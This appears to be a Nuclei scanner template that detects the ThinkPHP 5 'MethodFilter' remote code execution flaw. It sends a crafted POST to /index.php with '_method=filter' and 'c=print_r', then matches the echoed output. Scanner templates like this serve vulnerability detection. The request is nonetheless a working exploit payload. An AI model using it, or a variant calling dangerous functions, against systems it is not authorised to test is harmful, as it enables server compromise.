id: thinkphp-method-filter-code-exec
info:
  name: ThinkPHP 5 MethodFilter Remote Code Execution Vulnerability
  author: ProjectDiscoveryAI
  severity: high
  tags: rce,thinkphp
http:
  - raw:
      - |
        POST /index.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        c=print_r&f=4e5e5d7364f443e28fbf0d3ae744a59a&_method=filter
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "print_r4e5e5d7364f443e28fbf0d3ae744a59afilterprint_r4e5e5d7364f443e28fbf0d3ae744a59afilter"
